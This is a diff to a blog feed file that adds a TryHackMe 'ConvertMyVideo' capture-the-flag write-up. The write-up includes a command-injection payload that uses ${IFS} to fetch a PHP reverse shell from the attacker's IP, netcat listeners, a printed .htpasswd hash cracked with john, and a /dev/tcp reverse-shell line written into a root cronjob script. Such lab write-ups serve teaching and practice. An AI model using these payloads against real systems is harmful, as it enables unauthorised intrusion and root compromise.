@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>ConvertMyVideo on TryHackMe</title>
+      <link href="/2024/02/23/convertmymedio-tryhackme/"/>
+      <url>/2024/02/23/convertmymedio-tryhackme/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Well… I was stucked at the last step of this box, after I searched other’s Write Up, I learned a new tool - <code>pspy</code> which can moniter linux processes without root.  </p><p>Victim’s IP : 10.10.3.97<br>Attacker’s IP : 10.9.195.189  </p><h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>Command:</strong>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -PN 10.10.3.97</span><br></pre></td></tr></table></figure><p><strong>Result:</strong>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.3.97</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)</span><br><span class="line">|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)</span><br><span class="line">|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>nothing special though…  </p><h4 id="directory-enumeration"><a href="#directory-enumeration" class="headerlink" title="directory enumeration"></a>directory enumeration</h4><p><strong>Command:</strong>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.10.3.97/</span><br></pre></td></tr></table></figure><p><strong>Result:</strong><br>The most interesting part is the <code>admin</code> directory which required http-get auth.  </p><p><img src="https://hackmd.io/_uploads/rJuWhKrha.png" alt="image">  </p><h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><h4 id="command-injection"><a href="#command-injection" class="headerlink" title="command injection"></a>command injection</h4><p>The web page look like this, and after some tries, I found out a vulnerability with command injection.  </p><p><img src="https://hackmd.io/_uploads/Syuc3YrnT.png" alt="image">  </p><p>The interesting part is that it would block the <code>space</code> character and cut the post data with <code>&amp;</code>(me crying out loud : is and not end!!!)<br>Anyway, is still easy to bypass by <code>$&#123;IFS&#125;</code><br>Setting up a http server to make victim downloads the php reverse shell.  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 10000</span><br></pre></td></tr></table></figure><p>I opened it on port 10000  </p><p>Listening on port <strong>1004</strong> and wait for the reverse shell work:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 1004 <span class="comment">#rrrahhh</span></span><br></pre></td></tr></table></figure><p>Command injection payload:  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yt_url=;wget$&#123;IFS&#125;http://10.9.195.189:10000/reverse.php;</span><br></pre></td></tr></table></figure><p>And just visit <code>http://10.10.3.97:10000/reverse.php</code> to get shell on port <strong>1004</strong>  </p><h4 id="password-cracking"><a href="#password-cracking" class="headerlink" title="password cracking"></a>password cracking</h4><p>Well…although I don’t know why I should do this, but I <strong>must</strong> do this to complete the challenge(  </p><p>File:<code>/var/www/html/admin/.htpasswd</code>  </p><p>Content:<code>itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/</code>  </p><p>Simple crack with <code>john</code>:<br><strong>Command:</strong>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john pass --wordlist=rockyou.txt</span><br></pre></td></tr></table></figure><p><strong>Result:</strong>  </p><p><img src="https://hackmd.io/_uploads/SkMpkcHnT.png" alt="image">  </p><h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="pspy"><a href="#pspy" class="headerlink" title="pspy"></a>pspy</h4><p><a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a>  </p><p>Install it on victim’s machine:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.9.195.189:10000/pspy64</span><br></pre></td></tr></table></figure><p>And after a while, I noticed that there’s a cronjob run with <code>UID=0</code>, which probably run by <code>root</code><br><img src="https://hackmd.io/_uploads/SyLPx9Sna.png" alt="image">  </p><h4 id="reverse-shell-again"><a href="#reverse-shell-again" class="headerlink" title="reverse shell again"></a>reverse shell again</h4><p>Base on the cronjob discovered before, I edited the content of <code>clean.sh</code> to get a root’s shell.  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;sh -i &gt;&amp; /dev/tcp/10.9.195.189/5427 0&gt;&amp;1&quot;</span> &gt; clean.sh</span><br></pre></td></tr></table></figure><p>Open port <strong>5427</strong> on my computer:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvnp 5427</span><br></pre></td></tr></table></figure><p>Finally…  </p><p><strong>Get shell!!!</strong><br><img src="https://hackmd.io/_uploads/SJfHzqrhp.png" alt="image">  </p><h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>I am still procrastinating on my write up for Year of the Fox on TryHackMe …  </p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> Command Injection </tag>
+            
+            <tag> Pentesting </tag>
+            
+            <tag> TryHackMe </tag>
+            
+            <tag> pspy </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>一二月心情隨筆</title>
       <link href="/2024/02/21/2024-1-2/"/>
       <url>/2024/02/21/2024-1-2/</url>
@@ -745,9 +772,9 @@
             
             <tag> LFI </tag>
             
-            <tag> XSS </tag>
-            
             <tag> loTuX CTF </tag>
+            
+            <tag> XSS </tag>
             
             <tag> RCE </tag>
             
